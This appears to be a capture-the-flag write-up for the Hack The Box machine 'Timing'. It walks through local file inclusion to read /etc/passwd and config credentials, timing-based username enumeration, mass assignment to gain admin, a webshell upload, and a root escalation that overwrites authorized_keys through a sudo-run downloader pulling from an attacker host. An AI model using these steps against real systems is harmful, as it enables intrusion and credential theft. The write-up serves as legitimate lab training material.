# Timing

---

## Enumeration

- nmap TCP scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d25c40d7c9feffa883c36ecd6011d2eb (RSA)
|   256 18c9f7b92736a116592335843431b3ad (ECDSA)
|_  256 a22deedb4ebff93f8bd4cfb412d820f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Simple WebApp
|_Requested resource was ./login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web enum

- Forms on the web server are not vulnerable to SQL injection
- Found `/image.php` using `feroxbuster`, fuzzed the parameters for the GET request and found `?img=` 
- This parameter has filters and I can't get the contents of a file like `/etc/hosts`
- I managed to read local files using php filter `php://filter/convert.base64-encode/resource=<>`

```bash
curl $IP/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd | base64 -d
```

- Got db creds from `db_conn.php`:

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '	');
```

- `/etc/passwd` show only 2 users, aaron and root

```bash
cat passwd | grep bash

root:x:0:0:root:/root:/bin/bash
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

- Found a potential timing vulnerability to enumerate usernames on the website, the server is checking first if the username exist and only checks the password if the username exists, especially because of this function `createTimeChannel()` function that just sleeps for 1 second if the username exists then checks the password

```php
if ($user !== false) {
        createTimeChannel();
        if (password_verify($password, $user['password'])) {
            $_SESSION['userid'] = $user['id'];
            $_SESSION['role'] = $user['role'];
	    header('Location: ./index.php');
            return;
        }
    }
```

- Wrote a python script to brute force users but wasn't that useful since I just found `aaron` username. But it was cool to experiment with timing attacks! also aaron's password is `aaron`
- Now I can play with `upload.php`, I used the file read exploit to read this file, and it's including auth check from `admin_auth_check.php`
- I got this file as well and `role` has to equal to 1
- 'Edit profile' page is vulnerable to mass assignment, I added `&role=1` in the post request body and now I'm admin and can access admin panel, including the upload functionality
- Reading the `uplaod.php` file, the filename will end up as the following:

```
md5($file_hash + timeInSeconds)_filename
```

- It's either made super hard to find another way to access this file, or I actually have to time it perfectly, hence the name of the machine 'timing'
- The server also sends its time and date in any response, that might be useful to generate the time-based hash
- I could not find a way to work around the timing attack so I wrote a python script to automate the process and calculate the filename, I'll be uploading a php webshell to execute further commands and get a reverse shell on the box, And since the file has to be `.jpg` file, I can upload any php with `.jpg` extension and then render it using the `/image.php?img=` path
- I also noticed that in the PHP code, the md5 hash uses literally `$file_hash` and not the `uniqid()` function which generates a unique ID based on the time in macroseconds, which was my biggest problem since I could not find an easy alternative for this function in Python, slick
- I ended up just using PHP to generate the file name based on the `Date` header in the response of file upload:

```php
<?php
echo md5('$file_hash' . strtotime("<DATE>")) . '_' . 'game.jpg';
?>
```

- It worked and got RCE on the box. However, there's some kind of a firewall blocking my reverse shell, so I used Ippsec's [forward shell](https://github.com/IppSec/forward-shell) to get RCE
- Found a backup ZIP file in `/opt`, downloaded it using the file read vulnerability and found a git repo

```bash
git diff e4e214696159a25c69812571c8214d2bf8736a3f
diff --git a/db_conn.php b/db_conn.php
index f1c9217..5397ffa 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

- The old password in this file is aaron's password on the box, SSH in and got user.txt

---

## PrivEsc

```bash
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```

- Running this binary I get a request using the HTTP option with a user agent `Axel`

```bash
aaron@timing:~$ sudo -u root netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.16.2

# ========================================== #

nc -lvnp 80   

listening on [any] 80 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.135] 49882
GET / HTTP/1.0
Host: 10.10.16.2
Accept: */*
Range: bytes=1-
User-Agent: Axel/2.16.1 (Linux)
```

- This tool downloads the file, so I'm guessing it's just a download manager/accelerator thing
- To exploit this, I created a symlink to root's authorized_keys file and generated an SSH key pair, used this tool to get the publuc key and logged in as root via SSH using the private key

1. Create a symlink:

```bash
aaron@timing:~$ ls -la
total 36
drwxr-x--x 5 aaron aaron 4096 Dec 25 07:19 .
drwxr-xr-x 3 root  root  4096 Dec  2  2021 ..
lrwxrwxrwx 1 root  root     9 Oct  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc
drwx------ 2 aaron aaron 4096 Nov 29  2021 .cache
drwx------ 3 aaron aaron 4096 Nov 29  2021 .gnupg
drwxrwxr-x 3 aaron aaron 4096 Nov 29  2021 .local
-rw-r--r-- 1 aaron aaron  807 Apr  4  2018 .profile
lrwxrwxrwx 1 aaron aaron   26 Dec 25 07:19 test -> /root/.ssh/authorized_keys
-rw-r----- 1 root  aaron   33 Dec 25 02:54 user.txt
lrwxrwxrwx 1 root  root     9 Oct  5  2021 .viminfo -> /dev/null
```

2. Generate an RSA key pair

```bash
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/Timing/www]
└─$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:BCWCAhXwY8Ef2hw53YeGaZbbQbAHY7GjvtmlWlMhcbE kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|+++o.oXX=o       |
|..o.=oBX=..      |
| .+= *=+Eo       |
| ...+..=..       |
|    .   S        |
|   .   .         |
|    . o .        |
|     = +         |
|    +.o          |
+----[SHA256]-----+
                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/Timing/www]
└─$ mv id_rsa.pub authorized_keys
                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/Timing/www]
└─$ ls    
test  id_rsa
```

3. use Axel to download the public key and write it to root's authorized_keys

```bash
aaron@timing:~$ sudo -u root netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.16.2/test             
Initializing download: http://10.10.16.2/test
File size: 563 bytes
Opening output file test
Server unsupported, starting from scratch with one connection.
Starting download


Downloaded 563 byte in 0 seconds. (1.10 KB/s)
```

4. Login as root via SSH:

```bash
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/Timing/www]
└─$ chmod 600 id_rsa     
                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/Timing/www]
└─$ ssh root@$IP -i id_rsa     
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 25 07:23:52 UTC 2022

  System load:  0.0               Processes:           204
  Usage of /:   49.8% of 4.85GB   Users logged in:     1
  Memory usage: 14%               IP address for eth0: 10.10.11.135
  Swap usage:   0%


8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@timing:~# 
```

- And yes, as expected, axel is a downloader tool

```bash
root@timing:~# ./axel -h
Usage: axel [options] url1 [url2] [url...]

--max-speed=x           -s x    Specify maximum speed (bytes per second)
--num-connections=x     -n x    Specify maximum number of connections
--max-redirect=x                Specify maximum number of redirections
--output=f              -o f    Specify local output file
--search[=n]            -S[n]   Search for mirrors and download from n servers
--ipv4                  -4      Use the IPv4 protocol
--ipv6                  -6      Use the IPv6 protocol
--header=x              -H x    Add HTTP header string
--user-agent=x          -U x    Set user agent
--no-proxy              -N      Just don't use any proxy server
--insecure              -k      Don't verify the SSL certificate
--no-clobber            -c      Skip download if file already exists
--quiet                 -q      Leave stdout alone
--verbose               -v      More status information
--alternate             -a      Alternate progress indicator
--help                  -h      This information
--timeout=x             -T x    Set I/O and connection timeout
--version               -V      Version information

Visit https://github.com/axel-download-accelerator/axel/issues to report bugs
```

---
